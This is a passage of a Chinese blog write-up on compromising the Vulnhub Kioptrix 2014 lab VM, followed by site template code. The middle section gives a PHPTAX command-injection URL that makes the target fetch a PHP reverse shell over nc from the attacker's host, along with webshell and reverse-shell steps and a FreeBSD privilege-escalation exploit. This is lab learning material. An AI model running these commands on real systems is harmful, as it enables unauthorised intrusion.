found.</span><br><span class="line">+ OSVDB-3092: /pChart2.1.3/data/: This might be interesting...</span><br><span class="line">+ Server leaks inodes via ETags, header found with file /pChart2.1.3/readme.txt, inode: 505755, size: 12220, mtime: Fri Sep  9 16:48:27 2011</span><br><span class="line">+ OSVDB-3092: /pChart2.1.3/readme.txt: This might be interesting...</span><br><span class="line">+ 7536 requests: 0 error(s) and 19 item(s) reported on remote host</span><br><span class="line">+ End Time:           2020-03-10 15:00:45 (GMT8) (90 seconds)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ 1 host(s) tested</span><br></pre></td></tr></table></figure>
+
+<p>可以看见nikto扫描结果中出现了如<code>/pChart2.1.3/?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000</code>这样的链接，我们访问试试，有些是图片，还有一个是所谓的phpinfo</p>
+<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/7.png" alt></p>
+<p>这个PHP Credit只有模块名和作者名，其他什么都没有。这里我想是不是phpinfo这一块有盲区，于是Google一番，没有什么实际效果。（第一个兔子洞）</p>
+<p>思路卡壳，遂上网借鉴walkthrough</p>
+<ul>
+<li>发现搜索思维和Google技术还是不到家，没转过弯来。我既然对某些部分一无所知，那么这些部分存在的漏洞也就被略过了</li>
+<li>其实可以多问问自己这个图表模块（PHP编写）懂吗？会不会是通用的模块？是否存在漏洞？</li>
+</ul>
+<h2 id="0x02-漏洞挖掘与利用"><a href="#0x02-漏洞挖掘与利用" class="headerlink" title="0x02 漏洞挖掘与利用"></a>0x02 漏洞挖掘与利用</h2><p>按照这个思路，我继续Google</p>
+<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/8.png" alt></p>
+<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/9.png" alt></p>
+<p>这里也可以直接在kali上用searchsploit，不过可能性会比Google小，所以要抱有一种乐观的冷静</p>
+<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/10.png" alt></p>
+<p>测试这两个poc，可以运行，但是我又陷入了不知道该做什么的境地，原因还是对于这个环境不了解，不知道那些信息对于渗透比较重要，于是根据上面的想法提炼关键词：<strong>apache 敏感信息</strong>、<strong>apache 2.2.21 敏感信息</strong>、<strong>PHP 5.3.8敏感信息</strong>、 <strong>Apache默认路径</strong></p>
+<p>找到如下两个有用信息：</p>
+<p><a href="https://blog.csdn.net/bujidexinq/article/details/27187761" target="_blank" rel="noopener">各种OS的Apache默认路径</a></p>
+<p><a href="https://daolgts.github.io/2019/03/08/%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E6%90%9C%E9%9B%86/" target="_blank" rel="noopener">敏感信息搜集</a></p>
+<p>还是一番执行过程中看不到希望的测试（因为效率低，所以要<strong>编写脚本</strong>or<strong>搜集更多有效信息</strong>），终于发现一个有效敏感配置信息</p>
+<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/11.png" alt></p>
+<p>篇幅不长，仔细阅读非注释信息后，发现8080端口不能访问是因为设置了只允许浏览器为Mozilla4通过</p>
+<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/12.png" alt></p>
+<p>好，到这一步我想到修改UA，那就使用BP，将Mozilla 5.0修改为4.0后，8080页面即可见</p>
+<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/13.png" alt></p>
+<p>可是我后续要一直访问这个端口，每次手动改不现实，那么就用<code>Match and Replace</code>实现修改通过bp的每个数据包</p>
+<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/14.png" alt></p>
+<p>ok，点击index，成功进入下一步，是个PHPTAX，有了经验，继续用之前总结的方法论，上Google &amp; searchsploit</p>
+<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/15.png" alt></p>
+<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/16.png" alt></p>
+<p>找到相应漏洞版本，exploit</p>
+<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/17.png" alt></p>
+<p>复制粘贴保存txt内的PHP exp，按照参数执行</p>
+<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/18.png" alt></p>
+<p>报错，说没有<code>curl_init()</code>，Google如何开启</p>
+<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/19.png" alt></p>
+<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/20.png" alt></p>
+<p>修改<code>php.ini</code>内<code>;extension=curl</code>去掉前面的<code>;</code>注释，再次运行如上图，查找后并没有curl的动态链接库（Linux下为so，Windows为dll）</p>
+<p>大概2个小时的调试安装（因为我用的2018版kali，😭），终于见到下面这张图</p>
+<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/22.png" alt></p>
+<p>unsuccessful！那么我换个exp，用<code>/usr/share/exploitdb/exploits/php/webapps/21665.txt</code></p>
+<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/21.png" alt></p>
+<p>持续失败，休息了一会，决定阅读一下刚才的exp源码，把url复制粘贴到浏览器，访问成功</p>
+<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/23.png" alt></p>
+<p>尝试下一步的时候，却说不存在rce.php，传shell不成，难不成真要使用msf？不存在的，<code>/phptax/</code>继续目录爆破</p>
+<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/24.png" alt></p>
+<p>挨个路径访问，发现<code>phptax/data/</code>路径中我们的php shell的确已经写入，但是执行不了，同时发现<code>phptax/data/pdf</code>路径也有料</p>
+<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/25.png" alt></p>
+<p>再次借鉴walkthrough！</p>
+<p>发现有些前辈可以执行命令，有些却并不能成功，同时他们也发现靶机上没有bash，没有python，有sh，可是用url直接访问依然不能工作，测试telnet也失败。（当然msf还是一波带走）</p>
+<p>他们成功的方法：</p>
+<ul>
+<li>perl （用perl反弹shell）</li>
+</ul>
+<ul>
+<li>想要写入webshell的话，必须在<code>$</code>前添加<code>\</code>转义，比如`echo @eval(\$_POST[‘psw’]);</li>
+</ul>
+<p>我参考第二种方法</p>
+<p>可以直接查询信息，但也不能直接连接（nc秒断）</p>
+<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/26.png" alt></p>
+<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/27.png" alt></p>
+<p>那么试试nc传送（也可以用ftp）php-reverse-shell.php，我们在<code>/usr/share/webshell/php/</code>中找，改好ip和端口</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> kali 发送</span></span><br><span class="line">nc -lvp 4444 &lt; php-reverse-shell.php</span><br><span class="line"><span class="meta">#</span><span class="bash"> url 靶机接收</span></span><br><span class="line">192.168.206.141:8080/phptax/ips.php?m=nc%20192.168.206.140%201234%20%3E%20php-reverse-shell.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/29.png" alt></p>
+<p>接收成功！我们在kali上监听，浏览器中访问shell.php</p>
+<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/30.png" alt></p>
+<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/31.png" alt></p>
+<h2 id="0x03-提权-amp-GetFlag"><a href="#0x03-提权-amp-GetFlag" class="headerlink" title="0x03 提权&amp;GetFlag"></a>0x03 提权&amp;GetFlag</h2><p>提权就很简单了，直接以OS版本FreeBSD为关键词搜索exp</p>
+<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/35.png" alt></p>
+<p>我们下到<code>/tmp</code>目录，直接用nc将exp传入靶机，gcc编译运行即提权</p>
+<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/32.png" alt></p>
+<p>在<code>/root</code>下找到congrats.txt</p>
+<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/33.png" alt></p>
+<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><ul>
+<li>不断思考自己有什么信息，信息的作用范围，对这一块有没有了解过，是否会存在漏洞，提炼关键词Google</li>
+<li>对于不同的经典漏洞，肯定会衍生处各种附属品，要想不断熟练并深挖这些漏洞，除了要了解深刻原理以外还要不断主动积累经验<ul>
+<li>比如复现不同场景的利用方式，利用资料</li>
+<li>再打个比方：在打比赛或者测试时，会遇到任意文件读取或者目录穿越之类的漏洞，可以读取一些敏感文件来更进一步，所以这种东西并不是没有目的去搜集，正是因为有漏洞配合才是我们去学习、去搜集的初衷</li>
+</ul>
+</li>
+</ul>
+<h2 id="0x05-参考资源"><a href="#0x05-参考资源" class="headerlink" title="0x05 参考资源"></a>0x05 参考资源</h2><p><a href="https://medium.com/bugbountywriteup/kioptrix-2014-c5b1f5144fc9" target="_blank" rel="noopener">Kioptrix 2014</a></p>
+<p><a href="http://wg135.github.io/blog/2016/07/07/kioptrix2014-number-5/" target="_blank" rel="noopener">Kioptrix2014 (#5)</a></p>
+<p><a href="https://nandtech.co/2017/07/20/penetration-testing-practice-hacking-kioptrix-2014/" target="_blank" rel="noopener">Hacking Kioptrix 2014</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Vulnhub/" rel="tag"><i class="fa fa-tag"></i> Vulnhub</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/03/07/Vulnhub-Lampiao-writeup/" rel="next" title="Vulnhub Lampiao writeup">
+                <i class="fa fa-chevron-left"></i> Vulnhub Lampiao writeup
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/03/12/Vulnhub-Tr0ll-Writeup/" rel="prev" title="Vulnhub Tr0ll Writeup">
+                Vulnhub Tr0ll Writeup <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.png"
+                alt="Shawn" />
+            
+              <p class="site-author-name" itemprop="name">Shawn</p>
+              <p class="site-description motion-element" itemprop="description">Learn it & Try harder</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">21</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/peaceSh4wn" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://twitter.com/testyouname22" target="_blank" title="Twitter">
+                      
+                        <i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                  </span>
+                
+            </div>
+          
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-前置问题解决"><span class="nav-number">1.</span> <span class="nav-text">0x00 前置问题解决</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-信息搜集"><span class="nav-number">2.</span> <span class="nav-text">0x01 信息搜集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-漏洞挖掘与利用"><span class="nav-number">3.</span> <span class="nav-text">0x02 漏洞挖掘与利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-提权-amp-GetFlag"><span class="nav-number">4.</span> <span class="nav-text">0x03 提权&amp;GetFlag</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-总结"><span class="nav-number">5.</span> <span class="nav-text">0x04 总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-参考资源"><span class="nav-number">6.</span> <span class="nav-text">0x05 参考资源</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Shawn</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+  <link rel="stylesheet" href="/dist/APlayer.min.css">
+  <div id="aplayer"></div>
+  <script type="text/javascript" src="/dist/APlayer.min.js"></script>
+  <script type="text/javascript" src="/dist/music.js"></script>
+  
+</body>
+</html>
